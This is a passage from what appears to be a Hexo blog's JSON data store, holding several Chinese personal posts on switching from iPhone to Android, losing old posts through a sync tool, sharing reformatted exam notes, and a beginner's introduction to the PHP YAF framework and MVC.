2019-05-27\ntags:\n---\n我是一个自诩的游戏开发者。但现在为止（2019-0527）还没做个一个完整的游戏项目。\n但这并不意味着什么。任何事都要有个开始点。\n明天再努力吧。（昨天也说过，但今天是认真的！）\n","slug":"Hello-Gamer","published":1,"updated":"2020-03-07T05:32:47.293Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7h6cgku00003j3x5xf74tn6","content":"<p>我是一个自诩的游戏开发者。但现在为止（2019-0527）还没做个一个完整的游戏项目。<br>但这并不意味着什么。任何事都要有个开始点。<br>明天再努力吧。（昨天也说过，但今天是认真的！）</p>\n","site":{"data":{}},"excerpt":"","more":"<p>我是一个自诩的游戏开发者。但现在为止（2019-0527）还没做个一个完整的游戏项目。<br>但这并不意味着什么。任何事都要有个开始点。<br>明天再努力吧。（昨天也说过，但今天是认真的！）</p>\n"},{"title":"我不喜歡安卓","date":"2019-06-01T16:00:00.000Z","_content":"说起来，还真是第一次用安卓用机呢。\n\n<!-- more -->\n\n假期的时候，换掉了不能再用的 Iphone，第一次买 Android 机。很久之前的确有用过 Android，但那时懂的也少，对那时的我而言，Android 机不过是无法和 IOS 同步游戏的破旧系统。当然，用了几个月，发现那时的我错了。 Android 比 IOS 差的地方不只同步游戏 : )\n\n现在用的 MI8，是我经过一定深思熟虑，做了很多的妥协过后的结果，有的机型无法用完善的互联网，有的手机售后差，有的手机拍照不好。这也是第一次有的体验，因为买 iphone 根本不用考虑那么多。犹豫了近两个星期，我绝定买下了 MI8，不够好，但可以承受。\n\n## 后台\n\n用惯了 IOS，第一次在 Android 上看到颜色如此平淡的支付宝界面，发光如此惨白的屏幕，差点哭了。后面装软件时，打开小米应用商店，仿佛是进了挂满广告的小网站。装完软件，打开，先向我要电话权限，不给就自动关掉。呵呵呵，挺有契约精神的，但一个阅读软件你要什么电话权限？完全混乱的进程管理，有的软件打开挂在后台才能收到消息，有的软件不用。与 ios 不同的是，有的软件放在后台并不会自动关闭，而是一直挂在后台，当我放在后台很久之后，再打开，发现进程还保留着！\n\n虽然在苹果机上，当你按两次 HOME 键，也会看到很多程序，但你看到的只是这些 APP 的缓存，或者说，你在这些 APP 的浏览记录。\n\n如果你有安卓机，和苹果机，可以尝试关机再打开任务列表，安卓机的后台会完全消失，而苹果机却还保留着之前的记录。这是因为，苹果机的任务列表不是真正的后台，只是记录！所以，你频繁关掉苹果的后台并没有多大意义。\n\n当然，后面我也看了很多关于 Android 后台机制的文章，改变了对 Android 的看法。的确，相比 IOS 的伪后台，安卓的后台用的是 java 虚拟机，在设计更灵活，玩法上会更多样。很难想像，IOS 的单任务怎么做到小窗口播放。按理说，它是更有意思的设计。\n\n![我的手機界面](1559449236027.png)\n\n可是，在有着如此漂亮的系统，为什么就让我如此的不开心？\n\n## 通知\n\n问题还是在消息推送上。微博的消息，QQ 的消息，微信的消息。。。有些消息不需要即时查看，比如微博消息，追番通知，这些什么时候看，看不看无所谓；而有的消息是需要即时查看的，比如微信、QQ、陌陌。。。这些消息回慢了，回晚了，没看到，都有可能引起麻烦。Android 里的这些 APP ，它想要推送消息，就得保证，它必须活在后台。这很好理解，如果你都把我关掉了，从计算机的角度，已经死了，还怎么给你发消息嘛？于是，每个 APP 都必须常驻后台，小小的空间里就挤满了大大小小的程序，它们相互抢夺着电量，内存。现在你知道，为什么安卓机越用越卡了吧。（这里说的是一前几代安卓的问题，现在 Android P 已经改善了不少，但有些流氓 APP 还是这样。比如 腾X 的软件。）\n\n但苹果不是伪后台，切任务时，后台的程序不是死了吗？为什么它还能推送消息呢？\n\n苹果为了解决这一问题，建立起一套完善的推送机制。「你 APP，不能主动推送给用户，你要告诉我苹果，然后我来告诉用户。」在这一机制下，一旦程序切到后台，你在一定时间内没切回来，它就可以完全暂停了，就像脱水休眠的三体人，它们不耗电量，也不抢内存。在这一机制下，苹果可以保证自己的手机只需要极小的内存（在普通用户手里，苹果的3G内存比安卓的8G内存还流畅），用户可以放心的消息，而不用担心自己是否关了它的后台。\n\n事实上，Android 也建立了一套相同的机制，称作 FCM (Firebase Cloud Messaging)。但与苹果不同的是，Android 的这一消息机制并不要求每一个开发者参与。苹果管控用户下载 APP 的渠道（用户只能从 APP Store 安装软件），APP 不满足它的需求，是不给上它的商店。而 Android 没有统一渠道，你可以在 Google Play 上下载，也可以在 小米应用中心下载，也可以在 应用宝下载，因此开发者可以乱搞，想怎么来就怎么来，完全不考虑用户的手机会发生什么，只要我的程序能最大程度的运行就好了。\n\n## 下一台机子\n\n国内的互联网环境糟糕得让我无法安心得继续用 Android 机，话虽如此，但今后手机我还是会买安卓机的，因为便宜 ：P 但如果有的选，我还是更愿意买苹果用机。毕竟手机还是用来通讯的，如果通讯都做不好，消息都收不到，我要你还有什么用？Android 再好玩有 Nintendo Switch 好玩吗？：P\n\n话说回来，与其说不喜欢安卓，我不喜欢的是国内的互联网环境。如果有一天离开了这个环境，和周围的人聊天不再需要用腾X的软件，我想我还是会再爱上Android 的。\n","source":"_posts/我不喜歡安卓.md","raw":"---\ntitle: 我不喜歡安卓\ndate: 2019-06-02\ntags:\n---\n说起来，还真是第一次用安卓用机呢。\n\n<!-- more -->\n\n假期的时候，换掉了不能再用的 Iphone，第一次买 Android 机。很久之前的确有用过 Android，但那时懂的也少，对那时的我而言，Android 机不过是无法和 IOS 同步游戏的破旧系统。当然，用了几个月，发现那时的我错了。 Android 比 IOS 差的地方不只同步游戏 : )\n\n现在用的 MI8，是我经过一定深思熟虑，做了很多的妥协过后的结果，有的机型无法用完善的互联网，有的手机售后差，有的手机拍照不好。这也是第一次有的体验，因为买 iphone 根本不用考虑那么多。犹豫了近两个星期，我绝定买下了 MI8，不够好，但可以承受。\n\n## 后台\n\n用惯了 IOS，第一次在 Android 上看到颜色如此平淡的支付宝界面，发光如此惨白的屏幕，差点哭了。后面装软件时，打开小米应用商店，仿佛是进了挂满广告的小网站。装完软件，打开，先向我要电话权限，不给就自动关掉。呵呵呵，挺有契约精神的，但一个阅读软件你要什么电话权限？完全混乱的进程管理，有的软件打开挂在后台才能收到消息，有的软件不用。与 ios 不同的是，有的软件放在后台并不会自动关闭，而是一直挂在后台，当我放在后台很久之后，再打开，发现进程还保留着！\n\n虽然在苹果机上，当你按两次 HOME 键，也会看到很多程序，但你看到的只是这些 APP 的缓存，或者说，你在这些 APP 的浏览记录。\n\n如果你有安卓机，和苹果机，可以尝试关机再打开任务列表，安卓机的后台会完全消失，而苹果机却还保留着之前的记录。这是因为，苹果机的任务列表不是真正的后台，只是记录！所以，你频繁关掉苹果的后台并没有多大意义。\n\n当然，后面我也看了很多关于 Android 后台机制的文章，改变了对 Android 的看法。的确，相比 IOS 的伪后台，安卓的后台用的是 java 虚拟机，在设计更灵活，玩法上会更多样。很难想像，IOS 的单任务怎么做到小窗口播放。按理说，它是更有意思的设计。\n\n![我的手機界面](1559449236027.png)\n\n可是，在有着如此漂亮的系统，为什么就让我如此的不开心？\n\n## 通知\n\n问题还是在消息推送上。微博的消息，QQ 的消息，微信的消息。。。有些消息不需要即时查看，比如微博消息，追番通知，这些什么时候看，看不看无所谓；而有的消息是需要即时查看的，比如微信、QQ、陌陌。。。这些消息回慢了，回晚了，没看到，都有可能引起麻烦。Android 里的这些 APP ，它想要推送消息，就得保证，它必须活在后台。这很好理解，如果你都把我关掉了，从计算机的角度，已经死了，还怎么给你发消息嘛？于是，每个 APP 都必须常驻后台，小小的空间里就挤满了大大小小的程序，它们相互抢夺着电量，内存。现在你知道，为什么安卓机越用越卡了吧。（这里说的是一前几代安卓的问题，现在 Android P 已经改善了不少，但有些流氓 APP 还是这样。比如 腾X 的软件。）\n\n但苹果不是伪后台，切任务时，后台的程序不是死了吗？为什么它还能推送消息呢？\n\n苹果为了解决这一问题，建立起一套完善的推送机制。「你 APP，不能主动推送给用户，你要告诉我苹果，然后我来告诉用户。」在这一机制下，一旦程序切到后台，你在一定时间内没切回来，它就可以完全暂停了，就像脱水休眠的三体人，它们不耗电量，也不抢内存。在这一机制下，苹果可以保证自己的手机只需要极小的内存（在普通用户手里，苹果的3G内存比安卓的8G内存还流畅），用户可以放心的消息，而不用担心自己是否关了它的后台。\n\n事实上，Android 也建立了一套相同的机制，称作 FCM (Firebase Cloud Messaging)。但与苹果不同的是，Android 的这一消息机制并不要求每一个开发者参与。苹果管控用户下载 APP 的渠道（用户只能从 APP Store 安装软件），APP 不满足它的需求，是不给上它的商店。而 Android 没有统一渠道，你可以在 Google Play 上下载，也可以在 小米应用中心下载，也可以在 应用宝下载，因此开发者可以乱搞，想怎么来就怎么来，完全不考虑用户的手机会发生什么，只要我的程序能最大程度的运行就好了。\n\n## 下一台机子\n\n国内的互联网环境糟糕得让我无法安心得继续用 Android 机，话虽如此，但今后手机我还是会买安卓机的，因为便宜 ：P 但如果有的选，我还是更愿意买苹果用机。毕竟手机还是用来通讯的，如果通讯都做不好，消息都收不到，我要你还有什么用？Android 再好玩有 Nintendo Switch 好玩吗？：P\n\n话说回来，与其说不喜欢安卓，我不喜欢的是国内的互联网环境。如果有一天离开了这个环境，和周围的人聊天不再需要用腾X的软件，我想我还是会再爱上Android 的。\n","slug":"我不喜歡安卓","published":1,"updated":"2020-03-07T08:01:51.810Z","_id":"ck7h6cgl100013j3x2vs02evt","comments":1,"layout":"post","photos":[],"link":"","content":"<p>说起来，还真是第一次用安卓用机呢。</p>\n<a id=\"more\"></a>\n\n<p>假期的时候，换掉了不能再用的 Iphone，第一次买 Android 机。很久之前的确有用过 Android，但那时懂的也少，对那时的我而言，Android 机不过是无法和 IOS 同步游戏的破旧系统。当然，用了几个月，发现那时的我错了。 Android 比 IOS 差的地方不只同步游戏 : )</p>\n<p>现在用的 MI8，是我经过一定深思熟虑，做了很多的妥协过后的结果，有的机型无法用完善的互联网，有的手机售后差，有的手机拍照不好。这也是第一次有的体验，因为买 iphone 根本不用考虑那么多。犹豫了近两个星期，我绝定买下了 MI8，不够好，但可以承受。</p>\n<h2 id=\"后台\"><a href=\"#后台\" class=\"headerlink\" title=\"后台\"></a>后台</h2><p>用惯了 IOS，第一次在 Android 上看到颜色如此平淡的支付宝界面，发光如此惨白的屏幕，差点哭了。后面装软件时，打开小米应用商店，仿佛是进了挂满广告的小网站。装完软件，打开，先向我要电话权限，不给就自动关掉。呵呵呵，挺有契约精神的，但一个阅读软件你要什么电话权限？完全混乱的进程管理，有的软件打开挂在后台才能收到消息，有的软件不用。与 ios 不同的是，有的软件放在后台并不会自动关闭，而是一直挂在后台，当我放在后台很久之后，再打开，发现进程还保留着！</p>\n<p>虽然在苹果机上，当你按两次 HOME 键，也会看到很多程序，但你看到的只是这些 APP 的缓存，或者说，你在这些 APP 的浏览记录。</p>\n<p>如果你有安卓机，和苹果机，可以尝试关机再打开任务列表，安卓机的后台会完全消失，而苹果机却还保留着之前的记录。这是因为，苹果机的任务列表不是真正的后台，只是记录！所以，你频繁关掉苹果的后台并没有多大意义。</p>\n<p>当然，后面我也看了很多关于 Android 后台机制的文章，改变了对 Android 的看法。的确，相比 IOS 的伪后台，安卓的后台用的是 java 虚拟机，在设计更灵活，玩法上会更多样。很难想像，IOS 的单任务怎么做到小窗口播放。按理说，它是更有意思的设计。</p>\n<p><img src=\"1559449236027.png\" alt=\"我的手機界面\"></p>\n<p>可是，在有着如此漂亮的系统，为什么就让我如此的不开心？</p>\n<h2 id=\"通知\"><a href=\"#通知\" class=\"headerlink\" title=\"通知\"></a>通知</h2><p>问题还是在消息推送上。微博的消息，QQ 的消息，微信的消息。。。有些消息不需要即时查看，比如微博消息，追番通知，这些什么时候看，看不看无所谓；而有的消息是需要即时查看的，比如微信、QQ、陌陌。。。这些消息回慢了，回晚了，没看到，都有可能引起麻烦。Android 里的这些 APP ，它想要推送消息，就得保证，它必须活在后台。这很好理解，如果你都把我关掉了，从计算机的角度，已经死了，还怎么给你发消息嘛？于是，每个 APP 都必须常驻后台，小小的空间里就挤满了大大小小的程序，它们相互抢夺着电量，内存。现在你知道，为什么安卓机越用越卡了吧。（这里说的是一前几代安卓的问题，现在 Android P 已经改善了不少，但有些流氓 APP 还是这样。比如 腾X 的软件。）</p>\n<p>但苹果不是伪后台，切任务时，后台的程序不是死了吗？为什么它还能推送消息呢？</p>\n<p>苹果为了解决这一问题，建立起一套完善的推送机制。「你 APP，不能主动推送给用户，你要告诉我苹果，然后我来告诉用户。」在这一机制下，一旦程序切到后台，你在一定时间内没切回来，它就可以完全暂停了，就像脱水休眠的三体人，它们不耗电量，也不抢内存。在这一机制下，苹果可以保证自己的手机只需要极小的内存（在普通用户手里，苹果的3G内存比安卓的8G内存还流畅），用户可以放心的消息，而不用担心自己是否关了它的后台。</p>\n<p>事实上，Android 也建立了一套相同的机制，称作 FCM (Firebase Cloud Messaging)。但与苹果不同的是，Android 的这一消息机制并不要求每一个开发者参与。苹果管控用户下载 APP 的渠道（用户只能从 APP Store 安装软件），APP 不满足它的需求，是不给上它的商店。而 Android 没有统一渠道，你可以在 Google Play 上下载，也可以在 小米应用中心下载，也可以在 应用宝下载，因此开发者可以乱搞，想怎么来就怎么来，完全不考虑用户的手机会发生什么，只要我的程序能最大程度的运行就好了。</p>\n<h2 id=\"下一台机子\"><a href=\"#下一台机子\" class=\"headerlink\" title=\"下一台机子\"></a>下一台机子</h2><p>国内的互联网环境糟糕得让我无法安心得继续用 Android 机，话虽如此，但今后手机我还是会买安卓机的，因为便宜 ：P 但如果有的选，我还是更愿意买苹果用机。毕竟手机还是用来通讯的，如果通讯都做不好，消息都收不到，我要你还有什么用？Android 再好玩有 Nintendo Switch 好玩吗？：P</p>\n<p>话说回来，与其说不喜欢安卓，我不喜欢的是国内的互联网环境。如果有一天离开了这个环境，和周围的人聊天不再需要用腾X的软件，我想我还是会再爱上Android 的。</p>\n","site":{"data":{}},"excerpt":"<p>说起来，还真是第一次用安卓用机呢。</p>","more":"<p>假期的时候，换掉了不能再用的 Iphone，第一次买 Android 机。很久之前的确有用过 Android，但那时懂的也少，对那时的我而言，Android 机不过是无法和 IOS 同步游戏的破旧系统。当然，用了几个月，发现那时的我错了。 Android 比 IOS 差的地方不只同步游戏 : )</p>\n<p>现在用的 MI8，是我经过一定深思熟虑，做了很多的妥协过后的结果，有的机型无法用完善的互联网，有的手机售后差，有的手机拍照不好。这也是第一次有的体验，因为买 iphone 根本不用考虑那么多。犹豫了近两个星期，我绝定买下了 MI8，不够好，但可以承受。</p>\n<h2 id=\"后台\"><a href=\"#后台\" class=\"headerlink\" title=\"后台\"></a>后台</h2><p>用惯了 IOS，第一次在 Android 上看到颜色如此平淡的支付宝界面，发光如此惨白的屏幕，差点哭了。后面装软件时，打开小米应用商店，仿佛是进了挂满广告的小网站。装完软件，打开，先向我要电话权限，不给就自动关掉。呵呵呵，挺有契约精神的，但一个阅读软件你要什么电话权限？完全混乱的进程管理，有的软件打开挂在后台才能收到消息，有的软件不用。与 ios 不同的是，有的软件放在后台并不会自动关闭，而是一直挂在后台，当我放在后台很久之后，再打开，发现进程还保留着！</p>\n<p>虽然在苹果机上，当你按两次 HOME 键，也会看到很多程序，但你看到的只是这些 APP 的缓存，或者说，你在这些 APP 的浏览记录。</p>\n<p>如果你有安卓机，和苹果机，可以尝试关机再打开任务列表，安卓机的后台会完全消失，而苹果机却还保留着之前的记录。这是因为，苹果机的任务列表不是真正的后台，只是记录！所以，你频繁关掉苹果的后台并没有多大意义。</p>\n<p>当然，后面我也看了很多关于 Android 后台机制的文章，改变了对 Android 的看法。的确，相比 IOS 的伪后台，安卓的后台用的是 java 虚拟机，在设计更灵活，玩法上会更多样。很难想像，IOS 的单任务怎么做到小窗口播放。按理说，它是更有意思的设计。</p>\n<p><img src=\"1559449236027.png\" alt=\"我的手機界面\"></p>\n<p>可是，在有着如此漂亮的系统，为什么就让我如此的不开心？</p>\n<h2 id=\"通知\"><a href=\"#通知\" class=\"headerlink\" title=\"通知\"></a>通知</h2><p>问题还是在消息推送上。微博的消息，QQ 的消息，微信的消息。。。有些消息不需要即时查看，比如微博消息，追番通知，这些什么时候看，看不看无所谓；而有的消息是需要即时查看的，比如微信、QQ、陌陌。。。这些消息回慢了，回晚了，没看到，都有可能引起麻烦。Android 里的这些 APP ，它想要推送消息，就得保证，它必须活在后台。这很好理解，如果你都把我关掉了，从计算机的角度，已经死了，还怎么给你发消息嘛？于是，每个 APP 都必须常驻后台，小小的空间里就挤满了大大小小的程序，它们相互抢夺着电量，内存。现在你知道，为什么安卓机越用越卡了吧。（这里说的是一前几代安卓的问题，现在 Android P 已经改善了不少，但有些流氓 APP 还是这样。比如 腾X 的软件。）</p>\n<p>但苹果不是伪后台，切任务时，后台的程序不是死了吗？为什么它还能推送消息呢？</p>\n<p>苹果为了解决这一问题，建立起一套完善的推送机制。「你 APP，不能主动推送给用户，你要告诉我苹果，然后我来告诉用户。」在这一机制下，一旦程序切到后台，你在一定时间内没切回来，它就可以完全暂停了，就像脱水休眠的三体人，它们不耗电量，也不抢内存。在这一机制下，苹果可以保证自己的手机只需要极小的内存（在普通用户手里，苹果的3G内存比安卓的8G内存还流畅），用户可以放心的消息，而不用担心自己是否关了它的后台。</p>\n<p>事实上，Android 也建立了一套相同的机制，称作 FCM (Firebase Cloud Messaging)。但与苹果不同的是，Android 的这一消息机制并不要求每一个开发者参与。苹果管控用户下载 APP 的渠道（用户只能从 APP Store 安装软件），APP 不满足它的需求，是不给上它的商店。而 Android 没有统一渠道，你可以在 Google Play 上下载，也可以在 小米应用中心下载，也可以在 应用宝下载，因此开发者可以乱搞，想怎么来就怎么来，完全不考虑用户的手机会发生什么，只要我的程序能最大程度的运行就好了。</p>\n<h2 id=\"下一台机子\"><a href=\"#下一台机子\" class=\"headerlink\" title=\"下一台机子\"></a>下一台机子</h2><p>国内的互联网环境糟糕得让我无法安心得继续用 Android 机，话虽如此，但今后手机我还是会买安卓机的，因为便宜 ：P 但如果有的选，我还是更愿意买苹果用机。毕竟手机还是用来通讯的，如果通讯都做不好，消息都收不到，我要你还有什么用？Android 再好玩有 Nintendo Switch 好玩吗？：P</p>\n<p>话说回来，与其说不喜欢安卓，我不喜欢的是国内的互联网环境。如果有一天离开了这个环境，和周围的人聊天不再需要用腾X的软件，我想我还是会再爱上Android 的。</p>"},{"title":"放棄過去的文章了","date":"2019-05-29T16:00:00.000Z","_content":"我真傻，真的。。。\n\n<!-- more -->\n\n由于用某个同步软件的时候，没注意看说明（当然，作者也没说），导致过去了文章被 commit 盖住了。不仅如此，连我过去 commit 的记录也没了。呵呵呵\n\n也好吧，吸取教训，下次用软件之前，一定要好好了解运行规则。\n\n好在部分备份还留在电脑本地，好在过去的文章不值一提，好在也没人看过 : ) 。就让那过去成为历史，消失在茫茫宇宙之中。\n","source":"_posts/放棄過去的文章了.md","raw":"---\ntitle: 放棄過去的文章了\ndate: 2019-05-30\ntags:\n---\n我真傻，真的。。。\n\n<!-- more -->\n\n由于用某个同步软件的时候，没注意看说明（当然，作者也没说），导致过去了文章被 commit 盖住了。不仅如此，连我过去 commit 的记录也没了。呵呵呵\n\n也好吧，吸取教训，下次用软件之前，一定要好好了解运行规则。\n\n好在部分备份还留在电脑本地，好在过去的文章不值一提，好在也没人看过 : ) 。就让那过去成为历史，消失在茫茫宇宙之中。\n","slug":"放棄過去的文章了","published":1,"updated":"2020-03-07T08:01:36.395Z","_id":"ck7h6cgl300023j3x4jt4fdb5","comments":1,"layout":"post","photos":[],"link":"","content":"<p>我真傻，真的。。。</p>\n<a id=\"more\"></a>\n\n<p>由于用某个同步软件的时候，没注意看说明（当然，作者也没说），导致过去了文章被 commit 盖住了。不仅如此，连我过去 commit 的记录也没了。呵呵呵</p>\n<p>也好吧，吸取教训，下次用软件之前，一定要好好了解运行规则。</p>\n<p>好在部分备份还留在电脑本地，好在过去的文章不值一提，好在也没人看过 : ) 。就让那过去成为历史，消失在茫茫宇宙之中。</p>\n","site":{"data":{}},"excerpt":"<p>我真傻，真的。。。</p>","more":"<p>由于用某个同步软件的时候，没注意看说明（当然，作者也没说），导致过去了文章被 commit 盖住了。不仅如此，连我过去 commit 的记录也没了。呵呵呵</p>\n<p>也好吧，吸取教训，下次用软件之前，一定要好好了解运行规则。</p>\n<p>好在部分备份还留在电脑本地，好在过去的文章不值一提，好在也没人看过 : ) 。就让那过去成为历史，消失在茫茫宇宙之中。</p>"},{"title":"做點小工作","date":"2019-06-01T16:00:00.000Z","_content":"计算模拟考试前，老师发了一份复习题纲。用的是普通的文本写的，一些公式看上去很乱。\n\n于是边复习题纲，边修改，用 Latex 语法重新写了部分的公式，并做了点排版（写作者的天性 :P ）。总之，改得更容易看了一点。\n\n<!-- more -->\n\n![](1559472330222.png)\n\n![](1559472290996.png)\n\n![](1559472386325.png)\n\n![](1559472409652.png)\n\n只有一个人看也太无趣，放出来，以后谁有需要，谁就拿走好了。\n\n[PDF](https://files.catbox.moe/hy6qar.pdf)\n\n[HTML](https://files.catbox.moe/9z4wcm.html)\n","source":"_posts/做點小工作.md","raw":"---\ntitle: 做點小工作\ndate: 2019-06-02\ntags:\n---\n计算模拟考试前，老师发了一份复习题纲。用的是普通的文本写的，一些公式看上去很乱。\n\n于是边复习题纲，边修改，用 Latex 语法重新写了部分的公式，并做了点排版（写作者的天性 :P ）。总之，改得更容易看了一点。\n\n<!-- more -->\n\n![](1559472330222.png)\n\n![](1559472290996.png)\n\n![](1559472386325.png)\n\n![](1559472409652.png)\n\n只有一个人看也太无趣，放出来，以后谁有需要，谁就拿走好了。\n\n[PDF](https://files.catbox.moe/hy6qar.pdf)\n\n[HTML](https://files.catbox.moe/9z4wcm.html)\n","slug":"做點小工作","published":1,"updated":"2020-03-07T08:09:47.123Z","_id":"ck7h6rnf800004z3x0hfgh118","comments":1,"layout":"post","photos":[],"link":"","content":"<p>计算模拟考试前，老师发了一份复习题纲。用的是普通的文本写的，一些公式看上去很乱。</p>\n<p>于是边复习题纲，边修改，用 Latex 语法重新写了部分的公式，并做了点排版（写作者的天性 :P ）。总之，改得更容易看了一点。</p>\n<a id=\"more\"></a>\n\n<p><img src=\"1559472330222.png\" alt=\"\"></p>\n<p><img src=\"1559472290996.png\" alt=\"\"></p>\n<p><img src=\"1559472386325.png\" alt=\"\"></p>\n<p><img src=\"1559472409652.png\" alt=\"\"></p>\n<p>只有一个人看也太无趣，放出来，以后谁有需要，谁就拿走好了。</p>\n<p><a href=\"https://files.catbox.moe/hy6qar.pdf\" target=\"_blank\" rel=\"noopener\">PDF</a></p>\n<p><a href=\"https://files.catbox.moe/9z4wcm.html\" target=\"_blank\" rel=\"noopener\">HTML</a></p>\n","site":{"data":{}},"excerpt":"<p>计算模拟考试前，老师发了一份复习题纲。用的是普通的文本写的，一些公式看上去很乱。</p>\n<p>于是边复习题纲，边修改，用 Latex 语法重新写了部分的公式，并做了点排版（写作者的天性 :P ）。总之，改得更容易看了一点。</p>","more":"<p><img src=\"1559472330222.png\" alt=\"\"></p>\n<p><img src=\"1559472290996.png\" alt=\"\"></p>\n<p><img src=\"1559472386325.png\" alt=\"\"></p>\n<p><img src=\"1559472409652.png\" alt=\"\"></p>\n<p>只有一个人看也太无趣，放出来，以后谁有需要，谁就拿走好了。</p>\n<p><a href=\"https://files.catbox.moe/hy6qar.pdf\" target=\"_blank\" rel=\"noopener\">PDF</a></p>\n<p><a href=\"https://files.catbox.moe/9z4wcm.html\" target=\"_blank\" rel=\"noopener\">HTML</a></p>"},{"title":"初识 YAF 框架 和 MVC","date":"2019-07-13T16:00:00.000Z","_content":"这是我第一次使用 PHP 做开发。\n\n因为 PHP 的名声不够好，加之开发环境不是很方便（至少要懂得 WEB 相关的东西，才能开始学习）。于是也没怎么关注。但是现在有任务用到 YAF 框架，基于 PHP 做开发，也得懂一点东西了。\n\n至于为什么写这个，主要还是因为官方文档太不友好了。初学者上去看，只会先被复杂烦锁的配制文件难住，然后找不到方向，最后迷失在安装框架和配制上。有这点时间，用 python 怕是已经搞定一个网站了。于是我想，给想要尝试用 yaf 入门网页开发的新人，做点小工作，我说的不全，但会帮助你理解一个网站的大概设计。当然我也不保证自己写的东西能让人看懂就是了。\n\n首先，YAF 的框架结构树如下。\n\n```\n+ public \n  |- index.php // 入口文件 \n  |- .htaccess // 重写规则 \n  |+ css \n  |+ img \n  |+ js \n+ conf \n  |- application.ini // 配置文件 \n+ application \n  |+ controllers \n    |- Index.php // 默认控制器 \n  |+ views \n      |+ index // 默认视图目录 \n        |- index.phtml // 默认视图 \n  |+ modules // 其他模块 \n  |+ library // 本地类库 \n  |+ models // model目录 \n  |+ plugins // 插件目录\n```\n\n注意，前面有 + 号代表目录，- 号代表文件。让我们先把焦点放在 application 这个目录上。\napplication\n\n这个目录算是最主要的文件目录了。模型（Model）、控制器（Control）还有视图（View）都放在这里。\n\n模型（Model），如果用更常见的说法，它可能与对象更加接近。我个人无法完全描述这个东西。但我们得知道一样，数据是计算机中最重要的东西，而 Model 就是描述数据的东西。\n\n所谓的控制器（Control），就是网页的行为。比如，我们的其它函数从数据库里得到数据，通过控制器，将数据交给网页，让其渲染。又比如，网页表单提交上来时，要有一个函数接收数据，并存到数据库上，或者做其它操作。有时，这种函数也就做 API 接口。它连接着 模型 和 视图，作为中间的状态。\n\n再之，是视图（View），也就是我们的 HTML 页面。\n\n将一个项目分成上面三部分是有必要的，当然，可以不分，但这不利于合作。分开之后，我们负责页面的，只管页面就好了，它需要数据就去向 控制器 取，而 模型 也不用管页面，它做它的事，控制器会帮忙传数据。这样，一个项目就可以分给三部分人处理。\n\n回到 YAF 框架上。 YAF 框架完全遵循着 MVC 原则做的设计。\n\n再看上面 YAF 框架的其中三个目录。\n\n```\n+ application \n  |+ controllers\n    |- Index.php // 默认控制器 \n  |+ views \n    |+ index // 控制器 \n      |- index.phtml // 默认视图\n  |+ models // model目录 \n```\n\n这个框架就包含了上面提到的 MVC 三个组成部分。当然，了解完上面的东西还不够。我们先来考虑一下几个简单的小问题。\n\n第一，用户要怎么访问我们的网页？假设我们的网页写好了，用户要在浏览器里输入什么，才能访问到？\n\n第二，我们要怎么区分不同的页面？一个网站不可能只有一个网页，每个网页做的事情不同，用户不可能只停留在一个网页上。登录的页面、个人主页和好友页面，显然不是同一个东西，那么怎么区分它们，让我们输入不同的地址进入不同的页面？\n\n第三，我们要怎么把数据传到网页上？比如，当你登录之后，右上角会显示你的名字，名字很明显是从数据库里传来，传到控制器，然后传到页面，这中间是怎么操作的？\n\n第四，我们要怎么保存用户的状态？如果之前不了解 HTTP 协议，现在大概说一下，HTTP 协议是不会保存的。也就是说，在没有做过其它工作的情况下，你换到另一个页面，那一个页面是不知道你在这个页面做个什么，就算同一个页面，一刷新，它也不知道你做过什么。如果你在这个页面登录了，切到下一个页面，一切都消失了，那就很糟糕。那么该怎么做才能保留信息？\n\n篇符有限，先讨论前三个问题，后面一个问题下一篇文章再讨论。\n\n先前有说过，controllers 连接着 views 和 models。现在，先关注 controllers 和 views 的关系。\n\n```\n+ application \n  |+ controllers\n    |- Index.php // 默认控制器 \n  |+ views \n    |+ index // 默认视图目录\n      |- index.phtml // 默认视图\n```\n\n还是这个目录。可以发现，默认情况下，controllers 里的文件 Index.php 和 views 下的目录 index 字母是一样的。在这种情况下，Index 这个控制器就和 index 目录连在了一起。 控制器 Index.php 的代码如下:\n\n```php\n<?php\nclass IndexController extends Yaf_Controller_Abstract\n{\n    /**\n     * 默认 Action\n     */\n    public function indexAction()\n    {\n        $this->getView()->assign(\"content\", \"Hello World\");\n    }\n }\n\nindex.phtml 代码如下：\n\n<html>  \n<head>  \n    <title>Hello World</title>  \n</head>  \n<body>  \n    <?php echo $content;?>  \n</body>  \n</html>\n```\n\n类里只有一个函数，indexAction 这是 yaf 的默认命名方式。index 对应着视图 index.phtml。这样，当我们访问 http://域名/项目名/index/index 时，就能看到 index.phtml 里的东西了。同理，有这么一个目录：\n\n```\n+ application \n  |+ controllers\n    |- Index.php // 默认控制器 \n    |- Login.php // 新的控制器 \n\n  |+ views \n    |+ index // 默认视图目录\n      |- index.phtml // 默认视图\n    |+ login // 新的视图目录\n      |- index.phtml // 新的视图\n```\n\n那么访问 http://域名/项目名/login/index 就能访问到新的视图。\n\n如果这个新的图里，还有另一个页面。finished.phtml\n\n```\n+ application \n  |+ controllers\n    |- Index.php // 默认控制器 \n    |- Login.php // 新的控制器 \n\n  |+ views \n    |+ index // 默认视图目录\n      |- index.phtml // 默认视图\n    |+ login // 新的视图目录\n      |- index.phtml // 新的视图\n      |- finished.phtml // 新的视图\n```\n\n那么只要在 Login.php 里加一个新函数\n\n```php\n<?php  \n  \nclass LoginController extends AbstractController  \n{  indexAction()  \n {\n   \n  $this->getView()->assign(\"content\", \"Hello Login\");  \n  \n }  public function indexAction()  \n { \n \n  $this->getView()->assign(\"content\", \"Finishied!\");  \n  \n }}\n```\n\n那么再访问 http://域名/项目名/login/finished 就能访问到新的视图。\n\n就这么简单。函数里那一条唯一的代码，就是设定 一个名为 content 的变量，其值为 后面的字符串，并把它传到 phtml 上，再由 PHP 渲染。\n\n前三个问题就解决完了！\n","source":"_posts/初识-YAF-框架-和-MVC.md","raw":"---\ntitle: 初识 YAF 框架 和 MVC\ndate: 2019-07-14\ntags:\n---\n这是我第一次使用 PHP 做开发。\n\n因为 PHP 的名声不够好，加之开发环境不是很方便（至少要懂得 WEB 相关的东西，才能开始学习）。于是也没怎么关注。但是现在有任务用到 YAF 框架，基于 PHP 做开发，也得懂一点东西了。\n\n至于为什么写这个，主要还是因为官方文档太不友好了。初学者上去看，只会先被复杂烦锁的配制文件难住，然后找不到方向，最后迷失在安装框架和配制上。有这点时间，用 python 怕是已经搞定一个网站了。于是我想，给想要尝试用 yaf 